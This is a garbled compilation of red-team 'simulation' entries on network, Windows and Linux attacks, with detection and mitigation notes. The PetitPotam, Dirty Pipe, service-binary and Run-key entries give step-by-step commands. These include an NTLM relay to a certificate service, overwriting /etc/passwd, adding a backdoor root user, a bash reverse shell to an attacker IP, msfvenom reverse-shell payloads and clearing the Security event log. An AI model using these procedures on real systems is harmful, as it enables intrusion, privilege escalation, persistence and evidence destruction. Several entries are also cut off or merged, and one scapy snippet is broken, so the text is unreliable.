Scenario Description: This simulation demonstrates how an attacker can bypass weak or misconfigured OSPF authentication to inject unauthorized LSAs or form rogue adjacencies with internal routers. OSPF supports various authentication modes: Null (none), Plaintext (simple password), and MD5. If OSPF is running with no auth or reused/shared simple passwords, attackers can easily inject fake LSAs, form neighbor relationships, or manipulate the routing table. This can lead to MITM, route hijacking, or blackhole attacks. This attack is effective in networks that expose OSPF interfaces on internal VLANs or lack strict access control.
Tools Used: ✅ Kali Linux / Ubuntu (attacker)✅ scapy (to craft OSPF packets)✅ Wireshark (for sniffing OSPF LSAs)✅ GNS3 / EVE-NG (optional for lab emulation)✅ Quagga / FRRouting (optional for emulating routers)✅ Python with scapy.contrib.ospf
Attack Steps:

Title: BGP Prefix Hijacking
Scenario Description: This simulation illustrates how an attacker, with control over a malicious BGP-speaking router, can perform BGP prefix hijacking to falsely advertise ownership of IP prefixes belonging to another AS (Autonomous System). If upstream ISPs or IXPs (Internet Exchange Points) do not strictly filter BGP advertisements, the fake route can propagate globally, causing traffic to be rerouted, blackholed, or intercepted. This attack has been used in real-world incidents to hijack cryptocurrencies, perform surveillance, or disrupt service delivery. This is commonly simulated in BGP-enabled lab environments, ISPs, or cloud-based routers.
Tools Used: ✅ GNS3 or EVE-NG (to simulate ASes)✅ BGP-capable routers (FRRouting, Quagga, or Cisco IOS)✅ Kali Linux or Ubuntu (attacker)✅ Wireshark (BGP packet capture)✅ IP range to simulate hijacking✅ BGP Peering Lab Setup✅ (Optional) BGPMon / RIPEstat for detection validation

Title: BGP Route Flapping / Session Reset
Attack Type: Routing Protocol Abuse / BGP Session Disruption
Scenario Description: This simulation demonstrates how an attacker can disrupt BGP routing stability by either flapping advertised prefixes (rapidly withdrawing and re-announcing them) or by sending forged TCP RST packets to reset BGP sessions between legitimate routers. These attacks exploit the lack of encryption or session-layer protection in traditional BGP setups (TCP port 179) and are particularly effective in environments where routers are reachable over public or internal network segments. This can cause global route instability, increased convergence times, or denial of service for prefixes.
Tools Used: ✅ GNS3 or EVE-NG (to simulate routers)✅ BGP-capable routers (FRRouting, Quagga, Cisco IOS)✅ Kali Linux / Parrot OS (attacker)✅ Wireshark (to monitor BGP session)✅ Scapy (for TCP RST injection)✅ BGP route-monitoring tools like BGPMon / RIPE RIS / ExaBGP

from scapy.all import *

ip = IP(src="192.168.1.2", dst="192.168.1.1")

send(pkt)
✅ Send forged RST from client side---### 🟢 STEP 5: Confirm Session ResetOn R1:show ip bgp summary✅ BGP session with R2 has dropped✅ Routing table entries withdrawnRepeat from R2 to R1 to ensure bi-directional disruption---### 🛑 STEP 6: Cleanup• Stop flapping routes• Clear injected sessions• Reestablish BGP peering:clear ip bgp *Optional:• Apply filters to monitor BGP session stability• Enable logs for route churn and session resets
Target Type: ISP Routers<brPublic Peering Routers<brCloud Edge BGP Appliances
Vulnerability: - Lack of TCP protection- No TTL or MD5 protection for BGP- Overly permissive BGP peers- Missing prefix dampening policies
MITRE Technique: T1498.003 – Application Layer DoST1565.001 – Network Traffic ManipulationT1583.004 – Hijack Network Traffic
Impact: - Session reset = route loss- Continuous flapping = instability- Prefix dampening = false blackhole- Potential route leak or MITM through session takeover
Detection Method: - Monitor BGP logs for session resets- Enable logging on all BGP state changes- Monitor route churn thresholds- Use Wireshark to inspect TCP-level resets
Solution: - Enable BGP TTL security (GTSM)- Configure TCP MD5 signatures (RFC 2385)- Apply prefix dampening (BGP flap control)- Filter peer IPs with strict ACLs- Use secure transport (e.g., TCP-AO or IPsec tunnels)

Title: Man-in-the-Middle via BGP Manipulation

By announcing IP prefixes belonging to a legitimate AS and advertising them with shorter or more specific paths, the attacker convinces upstream routers to send traffic through the rogue ASN. The attacker can then inspect, manipulate, or drop this traffic. This method has been used in real-world surveillance operations and cryptocurrency heists.

Source: BGPStream Labs, RIPE NCC, Cloudflare BGP Blog, Cisco Secure Routing Guide, HackTricks, MITRE ATT&CK

Title: MS08-067 (NetAPI Exploit)

Scenario Description: MS08-067 is a critical remote code execution vulnerability in the Windows Server service (svchost.exe) due to a flaw in the handling of malformed RPC requests via SMB on port 445. It affects Windows XP, Server 2003, and Vista, and is wormable, allowing unauthenticated attackers to gain SYSTEM privileges remotely without any user interaction. It was the core vulnerability used by Conficker worm. The attacker sends a specially crafted RPC request to the vulnerable machine’s SMB service that overflows a buffer in NetAPI32.dll, allowing them to execute shellcode. This simulation demonstrates how a red teamer can exploit it using Metasploit in a lab setup.

Title: Zerologon (CVE-2020-1472)

Scenario Description: Zerologon is a critical privilege escalation vulnerability in the Netlogon Remote Protocol (MS-NRPC), affecting Windows Domain Controllers. It allows an unauthenticated attacker on the same network to impersonate the domain controller account by sending specially crafted Netlogon messages. This exploit abuses a cryptographic flaw where, due to improper use of AES-CFB8, an attacker can bypass authentication by sending all-zero challenge/responses. If successful, the attacker can reset the machine account password of the DC, perform full domain compromise, and impersonate any computer or user in Active Directory.

Title: PetitPotam + NTLM Relay (CVE-2021-36942)
Attack Type: NTLM Relay + Coerced Authentication via EFSRPC
Scenario Description: PetitPotam is an attack that forces Windows systems (including Domain Controllers) to authenticate to an attacker-controlled machine via MS-EFSRPC (Encrypting File System Remote Protocol). When combined with NTLM Relay, this allows attackers to relay the coerced NTLM authentication to a privileged service like Active Directory Certificate Services (AD CS) to request a certificate for domain admin impersonation. This attack chain leverages CVE-2021-36942, which was a flaw allowing unauthenticated users to abuse the EFSRPC protocol. This simulation walks through the full exploitation process and how it results in full domain compromise.

Attack Steps: ### 🟢 STEP 1: Setup the Lab• Deploy a Windows Server 2019 Domain Controller with AD CS installed• Ensure Web Enrollment is enabled in ADCS (http://dc/certsrv)• Install Kali Linux as the attacker machine• Confirm DC is reachable over ports 135 (RPC), 445 (SMB), and 80/443 (HTTP/S for ADCS)---### 🟢 STEP 2: Clone PetitPotamOn Kali:git clone https://github.com/topotam/PetitPotam.gitcd PetitPotamInstall requirements:sudo apt install python3-pippip3 install impacket---### 🟢 STEP 3: Configure NTLMRelay SetupIn one terminal:ntlmrelayx.py -t http://<DC-IP>/certsrv/certfnsh.asp -smb2support --adcs --template <template>✅ This sets up a relay server to intercept NTLM auth and relay it to ADCS to request a certificate🧠 You can use the default template like User or check valid ones:certify.exe list /vulnerable (if you have access)---### 🟢 STEP 4: Trigger NTLM Authentication via PetitPotamIn another terminal:python3 PetitPotam.py <attacker-ip> <dc-ip>This sends EFSRPC calls to DC, forcing it to authenticate to the attacker's relay (SMB/HTTP)✅ If successful, ntlmrelayx will relay the request to ADCS and request a certificate as the DC✅ Certificate is saved locally (e.g., dc.pfx)---### 🟢 STEP 5: Use Certificate to Authenticate as Domain AdminExtract PFX file or use directly:getST.py -dc-ip <dc-ip> -pfx-file dc.pfx -impersonate administrator✅ This retrieves a Kerberos TGT (ticket-granting ticket) as Domain AdminNow use tools like:secretsdump.py -k -no-pass <dc-ip> to dump full domain hashes---### 🟢 STEP 6: Post-Exploitation Actions• Add new domain admins• Dump sensitive GPOs or SYSVOL• Use Pass-the-Ticket to pivot laterally• Access file shares or create Golden Ticket---### 🛑 STEP 7: Cleanup• Remove saved PFX file• Revert DC snapshot• Disable Web Enrollment or restrict template usage• Reboot lab to clear cached Kerberos sessions

Solution: - Apply Microsoft patch for CVE-2021-36942<br- Disable NTLM where possible<br- Remove Web Enrollment role from ADCS<br- Restrict certificate templates and enforce EKU + Manager approval
Source: Microsoft Advisory CVE-2021-36942, HackTricks, Impacket Docs, Topotam GitHub, SpecterOps Blog

Title: Dirty COW (CVE-2016-5195) – Local Kernel Exploit
Scenario Description: Dirty COW is a critical local privilege escalation vulnerability in the Linux kernel’s memory subsystem, specifically in the handling of the copy-on-write (COW) mechanism. The flaw allows an unprivileged local user to write to read-only memory mappings, thereby overwriting system files (like /etc/passwd) or binaries they normally should not have access to. Exploiting Dirty COW lets attackers gain root privileges by modifying files in memory they should only be able to read. It was present in almost all major Linux distributions and kernel versions prior to 4.8.3. Title: OverlayFS Exploit (CVE-2021-3493) – Linux LPE

Title: Kernel Stack/Heap Overflow Exploits
Scenario Description: Stack and heap overflows in kernel-mode drivers or system calls are serious vulnerabilities that can lead to privilege escalation or full system compromise. These exploits overwrite data structures or return addresses in kernel memory space by sending malicious input from user space. Often used in CVE-based exploits, such as those in win32k.sys (Windows) or custom vulnerable drivers in CTFs and red team labs. Stack overflows usually corrupt return addresses, while heap overflows manipulate objects or function pointers. A successful exploit allows attackers to execute arbitrary code in kernel mode (Ring 0) and gain SYSTEM/root privileges.
Tools Used: ✅ Windows or Linux (target with known vulnerable driver)✅ Custom kernel exploit (PoC or CVE-based code)✅ C/C++ compiler (MinGW, GCC)✅ Sysinternals (Windows)✅ WinDbg or GDB (debugging)✅ VirtualBox/VMware snapshot (for safe testing)✅ Optional: exploit-db, MSF, or fuzzer for vuln discovery

Target Type: Windows (with vulnerable drivers)Linux (with outdated kernel)IoT/Embedded Linux
Vulnerability: - Lack of bounds checking in kernel drivers- Missing input validation in IOCTL handlers- Mismanaged memory allocations

Title: Dirty Pipe (CVE-2022-0847) – Linux Kernel 5.8+
Scenario Description: Dirty Pipe (CVE-2022-0847) is a local privilege escalation vulnerability in Linux kernel versions 5.8 and later, caused by improper handling of pipe buffers. It allows non-root local users to overwrite read-only files (even root-owned binaries like /etc/passwd) via a specially crafted splice() call, bypassing normal file system protections. Exploitation requires minimal privileges, making it ideal for post-exploitation privilege escalation. This bug is similar to Dirty COW (CVE-2016-5195) but more dangerous due to wider impact and ease of exploitation.
Tools Used: ✅ Vulnerable Linux system (kernel 5.8 - 5.16.10)✅ Local user shell (SSH, terminal, etc.)✅ Dirty Pipe PoC exploit (C code)✅ gcc compiler✅ Affected file with read-only root permissions (e.g., /etc/passwd)✅ Backup/restore capability or VM snapshot (for safety)
Attack Steps: ### 🟢 STEP 1: Confirm Vulnerable KernelCheck Linux kernel version:uname -r✅ Vulnerable versions: 5.8 → 5.16.10 (Ubuntu 20.04+, Debian Bullseye, Fedora 34+)---### 🟢 STEP 2: Create Unprivileged User (Optional)If testing:adduser testuser && su - testuserEnsure this user is not in sudoers---### 🟢 STEP 3: Identify Target FileChoose a file to overwrite (e.g., /etc/passwd)Confirm it is owned by root and read-only:ls -l /etc/passwdMake a backup first:cp /etc/passwd /tmp/passwd.bak---### 🟢 STEP 4: Download Dirty Pipe ExploitOn GitHub:• Max Kellermann’s Dirty Pipe ExploitClone and navigate:git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.gitcd CVE-2022-0847-DirtyPipe-Exploit---### 🟢 STEP 5: Compile Exploit CodeUse GCC:gcc -o dirtypipe dirtypipe.c -Wall---### 🟢 STEP 6: Run Exploit to Overwrite /etc/passwdPrepare malicious line to replace root password:root::0:0:root:/root:/bin/bashRun:./dirtypipe /etc/passwd "root::0:0:root:/root:/bin/bash\n"✅ This overwrites root’s hashed password with a blank oneNow login as root without password:su - root → No password prompt---### 🟢 STEP 7: Regain Full Root Access• Add backdoor user:echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd• Or, spawn reverse shell:bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1---### 🛑 STEP 8: Cleanup & RestoreRestore original /etc/passwd:cp /tmp/passwd.bak /etc/passwdReboot system:reboot✅ Exploit complete — gained root privileges from non-root user
Vulnerability: - Improperly initialized pipe buffers- Allows write access to read-only memory mappings
Impact: - Full local root access- Overwrite system files (passwd, sudoers, cron)- Persistent backdoors- Easy root-to-root privilege escalation
Detection Method: - Monitor for unauthorized file modifications (e.g., /etc/passwd)- Use auditd to detect access to critical files- Check kernel logs for splice() misuse- Use integrity monitoring (Tripwire)

Title: Driver Exploits (Windows) – Capcom.sys, dbutil_2_3.sys
Scenario Description: Signed but vulnerable Windows kernel drivers like Capcom.sys (from Capcom) and dbutil_2_3.sys (from Dell) expose IOCTL handlers that allow arbitrary memory reads/writes or code execution in Ring 0. Attackers drop and load these drivers on a victim machine and use them to bypass kernel-mode protections such as PatchGuard, Driver Signature Enforcement, or gain SYSTEM/root privileges. These exploits are often used in red teaming, CTFs, malware loaders, and allow execution of custom shellcode in kernel space from a non-admin user. Since the drivers are signed, Windows does not block them, unless revoked by Microsoft, making them ideal for stealthy exploitation.
Tools Used: ✅ Vulnerable signed driver binary (e.g., Capcom.sys, dbutil_2_3.sys)✅ Attacker user access (non-admin)✅ Exploit script (e.g., Capcom-Rootkit, DellDriverExploit)✅ Windows 7, 10, or Server VM (x64)✅ sc.exe, kdmapper, OSR Loader, or manual service loader✅ Process Hacker or WinDbg for memory debugging✅ Admin privileges (optional for driver install)✅ Shellcode or custom payload (e.g., system token stealer)

Title: Writable /etc/passwd or /etc/shadow (Linux)
Scenario Description: On Linux, critical authentication files like /etc/passwd and /etc/shadow store user account data and password hashes. If misconfigured, and either of these files are world-writable or user-writable, a local attacker can inject a new root-level user or modify existing password hashes, allowing them to gain full root shell access. This typically occurs due to poor file permission settings, buggy installer scripts, or accidental chmod usage. Exploiting this requires basic user shell access, and it's common in misconfigured Docker containers, shared hosting environments, or developer VMs.
Tools Used: ✅ Linux system (any distro)✅ Basic user shell (via SSH, local terminal, Docker container, etc.)✅ Command-line tools: echo, passwd, cat, chmod, sed, cp✅ Optional: Hashed password generator (openssl passwd, mkpasswd)✅ /etc/passwd or /etc/shadow is writable (e.g., via ls -l)

MITRE Technique: T1068 – Exploitation for Privilege EscalationT1552.004 – Unsecured Credentials: /etc/passwd, /etc/shadow

Source: GTFOBins, Exploit-DB, HackTricks, Linux Manpages, PentestMonkey

Title: Overwritable SUID Binary (Linux)
Scenario Description: In Linux, SUID (Set User ID) binaries run with the file owner’s privileges, typically root. If an SUID binary is world-writable or user-writable, an attacker with local shell access can replace its contents with a malicious binary (e.g., reverse shell or shell-spawning payload), and then execute it as root. This leads to full root shell access. Such misconfigurations may happen due to improper chmod, legacy software, CTF environments, or custom dev tools. This technique is often used in privilege escalation after gaining low-privilege user access.
Tools Used: ✅ Linux machine with local shell (SSH, terminal, Docker, etc.)✅ Vulnerable binary with -rws and write permission (e.g., /usr/bin/vuln)✅ ls, find, chmod, cp, whoami, gcc✅ Custom shell binary (optional)✅ Basic C knowledge (optional)
Target Type: Shared Linux serversDev/staging boxesMisconfigured Docker imagesCTF VMs
Vulnerability: - World/user writable SUID binaries- Incorrect file ownership or permissions- Lack of auditing on privileged binaries
MITRE Technique: T1548.001 – Abuse Elevation Control Mechanism: SUID/SGID Binaries
Impact: - Full local root privilege escalation- Execute reverse shell, persistence, or malware as root- Breakout from restricted environments
Detection Method: - Monitor for unexpected changes to SUID binaries (auditd, Tripwire, AIDE)- Detect permission changes with file integrity checks- Log SUID binary executions with auditd or Sysmon for Linux
Solution: - Never allow write permissions on SUID binaries- Audit SUID binaries regularly- Use chmod carefully – never chmod 777 on system paths- Use AppArmor/SELinux for fine-grained access control- Remove unnecessary SUID binaries
Source: GTFOBins, Exploit-DB, HackTricks, Linux Hardening Guides, OWASP Linux LPE Checklists

Title: Writable System Service File (Linux: systemd unit)
Scenario Description: On Linux systems using systemd, service unit files located in /etc/systemd/system/, /lib/systemd/system/, or /usr/lib/systemd/system/ define how system services behave. If any of these service files are writable by a non-root user, an attacker can inject malicious commands or binaries into the ExecStart or ExecStartPre fields. Once the service is restarted (manually or on reboot), the attacker’s code is executed with root privileges, leading to full privilege escalation. This vulnerability is often found in poorly configured environments, containers, CTFs, or development machines with weak ACLs.
Tools Used: ✅ Linux machine with systemd (e.g., Ubuntu, Debian, CentOS)✅ Local shell (e.g., SSH, Docker, Terminal)✅ Writable system service file (e.g., /etc/systemd/system/myapp.service)✅ echo, nano, vim, chmod, systemctl, bash, id✅ Root will eventually (or attacker can) restart the service

Target Type: Linux servers with systemdDocker containersShared workstationsDev/testing environments
Vulnerability: - Writable .service files under /etc/systemd/system/- Misconfigured file permissions or group ownership- Lack of auditing on service file changes

Title: Windows: Weak Permission on Service Executable
Scenario Description: On Windows systems, many services run with elevated privileges (often as LocalSystem). If the binary tied to a service (ImagePath in registry) is located at a path where a non-admin user has write access, the attacker can replace the executable with a malicious payload (like a reverse shell or privilege escalation binary). When the service restarts, it runs the attacker-controlled binary as SYSTEM, leading to full privilege escalation. This is a common misconfiguration in enterprise environments, legacy systems, or custom service deployments. The attack works even if the service is not running — as long as it will be restarted by the system or user.
Tools Used: ✅ Windows target machine (local user shell)✅ accesschk.exe (from Sysinternals)✅ sc.exe (native)✅ icacls.exe✅ Windows Command Prompt or PowerShell✅ Optional: Custom payload (MSFVenom reverse shell or simple netcat bind shell)✅ Meterpreter, Netcat or msfconsole listener
Attack Steps: ### 🟢 STEP 1: Enumerate Services with Writable BinariesUse Sysinternals' accesschk to find services where current user has write access to the binary:accesschk.exe -uwcqv "Users" %SystemRoot%\System32accesschk.exe -uwcqv "Users" "C:\Program Files\"Or manually find services:sc qc <service_name> → look at the BINARY_PATH_NAMEThen check if the executable path is writable:icacls "C:\Program Files\VulnApp\appsvc.exe"✅ If output includes BUILTIN\Users:(I)(M) → it's modifiable---### 🟢 STEP 2: Backup and Replace ExecutableAlways backup original binary:copy "C:\Program Files\VulnApp\appsvc.exe" C:\Temp\appsvc.bakGenerate malicious payload (example: reverse shell using MSFvenom):msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f exe -o shell.exeReplace the original binary:copy shell.exe "C:\Program Files\VulnApp\appsvc.exe"---### 🟢 STEP 3: Trigger the ServiceTrigger service restart manually (if you have permission):sc stop VulnService && sc start VulnServiceOr wait until system reboot / admin restartStart your listener on the attack box:nc -nlvp 4444 or in Metasploit: exploit/multi/handler✅ You will receive a SYSTEM-level reverse shell---### 🟢 STEP 4: CleanupReplace back original binary (if possible):copy C:\Temp\appsvc.bak "C:\Program Files\VulnApp\appsvc.exe"Clear payload traces:del shell.exe, wevtutil cl Security (if allowed)✅ Now attacker had SYSTEM access without triggering AV (if shell was custom-packed)---🧠 Tips:• This method is stealthy — no new services created• Works well in misconfigured dev environments• Some installers drop services in user-writable folders (like C:\Tools)• Can be chained with startup persistence
Target Type: Enterprise Windows systemsLegacy/Dev Windows servicesShared environmentsVMs in labs
Vulnerability: - Misconfigured file permissions on service executable- Writeable ImagePath target- Weak ACLs (Users/Everyone with Modify rights)
MITRE Technique: T1574.010 – Hijack Execution Flow: Services File Permissions Weakness
Impact: - Local privilege escalation to SYSTEM- Full takeover of system or domain member- Ability to dump SAM, move laterally, or install persistent backdoors
Detection Method: - Monitor file permission changes on known service binaries- Use Sysmon to detect service image path changes- Enable auditing for service restarts (eventvwr → System log → Service Control Manager)
Solution: - Only allow Administrators to write to service executables- Use icacls to audit service paths regularly- Reconfigure vulnerable services to secure folders- Harden file system ACLs on %ProgramFiles%, %SystemRoot% folders

Title: Windows: Writable AutoRun Registry Key
Scenario Description: Windows uses AutoRun registry keys to define programs that start automatically at user or system login. If one of these registry keys is writable by a low-privileged user, the attacker can insert a malicious command or payload that gets executed on the next reboot or login, potentially running as SYSTEM or administrator. This vulnerability is often found in misconfigured corporate environments, shared Windows machines, or CTFs. It can also serve as a stealthy persistence method during post-exploitation.
Tools Used: ✅ reg.exe (Windows native)✅ PowerShell✅ accesschk.exe (Sysinternals)✅ Optional: Custom payload (reverse shell, calculator, etc.)✅ Listener (netcat, msfconsole)✅ Optional: autoruns.exe for analysis
Attack Steps: ### 🟢 STEP 1: Identify Writable AutoRun KeysUse Sysinternals accesschk to scan for registry keys:accesschk.exe -w -s -u "Users" HKLM\Software\Microsoft\Windows\CurrentVersion\RunIf result includes (A) for "Users" group → write access confirmed ✅Check also:HKCU\Software\Microsoft\Windows\CurrentVersion\Run → writable by current userHKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce---### 🟢 STEP 2: Create or Modify Registry EntryAssume we have write access to:HKLM\Software\Microsoft\Windows\CurrentVersion\RunAdd new entry:reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousBoot /t REG_SZ /d "C:\Users\Public\payload.exe"Or via PowerShell:Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Users\Public\rev.exe"✅ This will run the executable every time Windows boots---### 🟢 STEP 3: Prepare the PayloadUse MSFvenom to generate reverse shell:msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f exe -o rev.exeTransfer to victim machine:copy rev.exe C:\Users\Public\rev.exeStart listener on attack machine:nc -nlvp 4444---### 🟢 STEP 4: Reboot or Trigger ExecutionOnce the system reboots or user logs in:➡️ The payload in registry key executes with SYSTEM privileges if in HKLM➡️ Attacker catches shell on listener✅ Privilege escalation achieved or persistent backdoor installed---### 🟢 STEP 5: CleanupDelete registry key:reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousBoot /fRemove payload:del C:\Users\Public\rev.exe🧠 Optional: Use Autoruns.exe to spot other persistence keys---🧠 Tips:• Works well for stealthy persistence• Often missed by basic AV• HKCU keys don’t need admin rights• Can use batch or PowerShell instead of .exe
Target Type: Corporate Windows endpointsShared Windows labs or CTF VMsLocal or domain-joined users
Vulnerability: - Write access to HKLM or HKCU Run/RunOnce keys- Poor ACLs on sensitive registry paths- Missing registry auditing
MITRE Technique: T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Impact: - Execute malware or payload at every boot/login- Privilege escalation (if HKLM path used)- Establish stealthy persistence on target
Detection Method: - Monitor registry changes with Sysmon (Event ID 13)- Use Autoruns.exe to audit autorun entries- Enable registry auditing for Run keys- SIEM alerting on new Run entries
Solution: - Apply least privilege on registry keys- Remove Users/Everyone write access from HKLM keys- Regularly scan registry for autorun entries- Use AppLocker or Windows Defender Application Control policies

Title: Writable Scheduled Task or Cronjob
Scenario Description: Many systems use scheduled tasks (Windows Task Scheduler) or cronjobs (Linux) for automated operations. If these tasks or the scripts they call are writable by unprivileged users, attackers can modify the task or its executable, gaining code execution with elevated privileges the next time the task runs. On Windows, this can escalate to SYSTEM, and on Linux to root, depending on the task context. Common in misconfigured systems, dev/test environments, or poorly secured containers. Title: DLL Hijacking (Windows)
Scenario Description: DLL Hijacking occurs when a Windows executable attempts to load a Dynamic Link Library (DLL) without specifying the full path, and the OS searches directories in a specific order (current directory, system directories, etc.). If an attacker can place a malicious DLL in a directory that is searched before the real one, Windows loads and executes the attacker’s DLL with the same privilege level as the process. This technique is frequently used for privilege escalation, persistence, or bypassing application whitelisting, and is commonly found in poorly developed software, insecure install paths, or signed executables using relative DLL paths.
